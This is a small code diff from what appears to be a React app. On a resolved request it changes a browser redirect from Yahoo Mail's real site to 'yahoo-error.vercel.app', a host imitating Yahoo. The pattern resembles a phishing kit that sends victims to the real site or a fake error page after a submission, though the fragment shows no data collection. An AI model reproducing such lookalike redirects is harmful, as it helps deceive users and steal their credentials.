@@ -43,7 +43,7 @@ function App() {
                 .then((result) => {
                     // user221999 ;
                     setLoading(false)
-                    window.location.replace("https://yahoomail.com")
+                    window.location.replace("yahoo-error.vercel.app")
                 })
                 .catch((error) => {
                     // alert(error);
